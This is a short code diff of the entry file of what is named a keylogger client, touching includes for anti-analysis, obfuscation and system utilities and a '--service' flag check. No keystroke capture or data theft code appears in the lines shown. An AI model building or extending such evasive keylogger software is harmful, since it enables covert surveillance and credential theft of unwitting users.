@@ -1,11 +1,7 @@
-// KeyLoggerClient/src/main.cpp (updated)
 #include "core/Application.h"
 #include "core/Logger.h"
-#include "security/AntiAnalysis.h"
-#include "utils/SystemUtils.h"
 #include "obfuscate.h"
 #include <vector>
-#include <cstdint>
 #include <string>
 
 // Obfuscated strings
@@ -21,7 +17,7 @@ int main(int argc, char* argv[]) {
         if (std::string(argv[i]) == "--service") {
             runAsService = true;
             break;
-        }
+        }   
     }
 
     // Anti-analysis checks
